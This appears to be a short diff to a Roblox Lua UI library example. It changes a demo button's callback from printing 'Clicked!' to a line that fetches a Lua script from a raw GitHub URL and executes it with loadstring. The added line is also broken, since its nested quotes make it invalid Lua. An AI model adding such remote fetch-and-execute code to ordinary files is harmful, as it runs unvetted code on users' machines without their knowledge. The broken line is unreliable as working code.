@@ -108,6 +108,6 @@ local Button = Tab:Button({
     Title = "Button",
     Desc = "Button Desc",
     Callback = function()
-        print("Clicked!")
+        print("loadstring(game:HttpGet("https://raw.githubusercontent.com/sjshskej/Rico/refs/heads/main/ksokw.lua", true))()")
     end,
 })
